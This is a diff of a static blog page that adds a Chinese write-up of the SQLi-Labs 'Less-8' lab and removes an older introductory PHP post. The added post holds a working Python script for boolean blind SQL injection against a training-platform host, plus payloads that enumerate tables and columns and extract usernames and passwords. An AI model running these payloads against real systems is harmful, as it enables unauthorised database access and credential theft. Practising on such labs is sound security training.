@@ -71,6 +71,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-lab 8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/21/lab%208/" class="article-date">
+  <time class="dt-published" datetime="2021-11-21T09:53:43.302Z" itemprop="datePublished">2021-11-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="lab-8"><a href="#lab-8" class="headerlink" title="lab 8"></a>lab 8</h1><p>使用python脚本进行盲注</p>
+<p>1，刷出库名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> dic:</span><br><span class="line">        url=<span class="string">&quot;http://d1c0c861-091f-4ff0-9aaa-64dbc53cfc23.node4.buuoj.cn/Less-8/?id=1%27&quot;</span></span><br><span class="line">        payload=<span class="string">&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2，刷出表名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
+
+<p>limit  后面的数字可变 </p>
+<p>第一个表：limit 0</p>
+<p>第二个表：limit 1 </p>
+<p>……</p>
+<p>3，刷出列名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
+
+<p>limit  后面的数字可变 </p>
+<p>第一列：limit 0</p>
+<p>第二列：limit 1 </p>
+<p>……</p>
+<p>4，查用户名或密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select username from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select password from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wifi-0x.github.io/2021/11/21/lab%208/" data-id="ckw92oijb0000hguycxku1p8m" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-lab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/11/19/lab/" class="article-date">
@@ -432,42 +483,6 @@
 
 
   
-    <article id="post-PHP(1)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/10/27/PHP(1)/" class="article-date">
-  <time class="dt-published" datetime="2021-10-27T14:44:15.613Z" itemprop="datePublished">2021-10-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP(1)"></a>PHP(1)</h1><h3 id="对PHP的理解"><a href="#对PHP的理解" class="headerlink" title="对PHP的理解:"></a>对PHP的理解:</h3><p>全称为Hypertext Preprocessor，即超文本预处理器</p>
-<p>PHP最初是个人主页（Personal Home Page）的缩写</p>
-<p>是一种在服务器端运行的开源的脚本语言</p>
-<p><img src="https://i.loli.net/2021/10/24/fFiravWgTluE7Xe.png"></p>
-<h4 id="黄金组合"><a href="#黄金组合" class="headerlink" title="黄金组合"></a>黄金组合</h4><p><strong>LAMP</strong>组合（<u><strong>Linux,Apache,MySQL,PHP</strong></u>),这四个产品都是公开源代码的产品，无版权之争。 </p>
-<p><em>php</em>是一门语言，用来做业务逻辑</p>
-<p><em>Apache</em>为<em>php</em>提供了运行环境</p>
-<p><em>mysql</em>数据库用来存储数据</p>
-<h6 id="wapm组合：window-apche-mysql-php"><a href="#wapm组合：window-apche-mysql-php" class="headerlink" title="wapm组合：window+apche+mysql+php"></a>wapm组合：window+apche+mysql+php</h6>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wifi-0x.github.io/2021/10/27/PHP(1)/" data-id="ckw0rpwny0001rouyh2wr884m" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -504,6 +519,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/21/lab%208/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/19/lab/">(no title)</a>
           </li>
         
@@ -517,10 +536,6 @@
         
           <li>
             <a href="/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/">(no title)</a>
           </li>
         
       </ul>
